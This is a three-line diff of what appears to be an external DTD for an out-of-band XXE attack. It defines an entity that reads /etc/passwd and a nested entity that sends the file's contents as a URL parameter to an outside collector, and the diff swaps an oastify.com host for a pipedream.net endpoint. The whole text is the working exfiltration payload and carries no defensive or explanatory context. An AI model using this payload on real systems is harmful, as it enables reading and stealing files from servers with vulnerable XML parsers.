@@ -1,3 +1,3 @@
 <!ENTITY % data SYSTEM "file:///etc/passwd">
-<!ENTITY % param "<!ENTITY exfil SYSTEM 'https://5qwv2o8z86wg3wk56ggkajncc3iu6quf.oastify.com/exfil?data=%data;'>">
+<!ENTITY % param "<!ENTITY exfil SYSTEM 'https://eoow6y96ffo9mzx.m.pipedream.net/exfil?data=%data;'>">
 %param;
